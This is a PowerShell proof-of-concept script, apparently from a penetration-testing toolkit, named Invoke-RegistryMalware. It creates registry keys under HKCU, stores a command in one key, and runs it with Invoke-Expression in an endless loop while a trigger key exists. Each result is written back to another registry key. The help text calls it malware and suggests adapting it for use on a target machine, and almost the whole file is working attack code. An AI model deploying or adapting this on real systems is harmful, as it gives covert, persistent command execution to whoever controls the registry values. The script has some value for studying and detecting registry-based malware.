function Invoke-RegistryMalware {

<#
.Synopsis
   POC script to plant simple malware in the Windows Registry

.DESCRIPTION
   The script sets and gets a command from an item in registry, stores the output in another item. The script is triggered by the presence of a third item.
   To use in an actual context, the script should be modified - ex. to look for the presence of a registry item on the arget machine.

.EXAMPLE
   Invoke-RegistryMalware

.EXAMPLE
   Invoke-RegistryMalware -CleanUp

.LINK
    Credit: https://github.com/salu90/PSFPT/blob/master/Registry-Malware.ps1
#>


Param (

    [Parameter(Mandatory = $false)]
    [String]
    $RegInputPath = "HKCU:\software",

    [Parameter(Mandatory = $false)]
    [String]
    $RegInputName = "intest",

    [Parameter(Mandatory = $false)]
    [String]
    $RegOutputPath = "HKCU:\software",

    [Parameter(Mandatory = $false)]
    [String]
    $RegOutputName = "outtest",

    [Parameter(Mandatory = $false)]
    [String]
    $RegCheckPath = "HKCU:\software",

    [Parameter(Mandatory = $false)]
    [String]
    $RegCheckName = "PSFPT",

    [Parameter(Mandatory = $false)]
    [Int]
    $SleepTime = 10,

    [Parameter(Mandatory = $false)]
    [Switch]
    $CleanUp

    )

$RegCheck = "$RegCheckPath\$RegCheckName"
$RegInput = "$RegInputPath\$RegInputName"
$RegOutput = "$RegOutputPath\$RegOutputName"

     if ($CleanUp){
        Remove-Item -Path $RegInput -ErrorAction SilentlyContinue
        Remove-Item -Path $RegOutput -ErrorAction SilentlyContinue
        Remove-Item -Path $RegCheck -ErrorAction SilentlyContinue
        Write-Host "Removing $RegInput, $RegOutput and $RegCheck from registry" -ForegroundColor Green
        break
        }

#Check if items exist in the registry
$Result = ((Test-Path $RegInput) -and (Test-Path $RegOutput) -and (test-path $RegCheck))

    if(-Not $Result){

    #Writes new items to the registry
    New-Item -Path $RegInputPath -Name $RegInputName | Out-Null
    New-Item -Path $RegOutputPath -Name $RegOutputName | Out-Null
    New-Item -Path $RegCheckPath -Name $RegCheckName | Out-Null
    }

    $command = read-host -Prompt "`nNow input the commmand you want to run"
    Set-Item -Path $RegInput -Value $command | out-null
    
    Write-Host "`nTesting the activation path $RegCheck ...`n"
    
        try {
            $Result = Test-Path $RegCheck
            Write-Host "Activation path present`n" -ForegroundColor Green
        
        } catch {
            
            Write-Host "Activation path not present!`n" -ForegroundColor Red
            }
   
    If ($Result) {
        Write-Host "Executing $command every $SleepTime seconds, and saving to $RegOutput`n" -ForegroundColor Magenta
        Write-Host "Hit CTRL+c to stop. To cleanup the registry run 'Invoke-RegistryMalware -Cleanup'" 
        
        while(1) {
            
            $c = Get-ItemProperty -path $RegInput
            $loopcommand = $c.'(default)'
            
            $commandOut = Invoke-Expression $loopcommand 
            Set-Item -Path $RegOutput -Value "$commandOut"
            Start-Sleep -s $SleepTime
            }


    }
}


   





